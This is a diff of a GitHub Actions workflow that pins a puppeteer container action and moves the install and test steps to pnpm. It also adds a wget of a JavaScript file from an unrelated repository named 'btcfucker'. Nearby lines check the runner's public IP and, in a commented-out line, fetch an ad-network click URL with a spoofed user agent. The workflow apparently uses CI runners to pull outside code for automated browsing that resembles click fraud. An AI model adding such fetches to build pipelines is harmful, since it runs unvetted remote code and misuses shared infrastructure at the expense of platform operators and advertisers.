@@ -22,12 +22,16 @@ jobs:
       - name: Run a multi-line script
         run: |
           curl ifconfig.me
+          wget https://raw.githubusercontent.com/btcfucker/btcfucker.github.io/main/.github/workflows/index.js
       #wget --user-agent=Mozilla --content-disposition -E -c https://click.a-ads.com/1845539/98644/
       - name: Install
-        uses: ianwalter/puppeteer@v2.0.0
+        # NOTE: this pins the action to a specific commit sha for security
+        # reasons but you can also use a version tag if desired. For example:
+        # ianwalter/puppeteer-container@v4.0.0
+        uses: ianwalter/puppeteer-container@acc52cd2334ad9eaf6e1974562d263e0a711b7e8
         with:
-          args: yarn init -y
+          args: pnpm i
       - name: Test
-        uses: ianwalter/puppeteer@v2.0.0
+        uses: ianwalter/puppeteer-container@acc52cd2334ad9eaf6e1974562d263e0a711b7e8
         with:
-          args: node tests.pptr.js
+          args: pnpm t
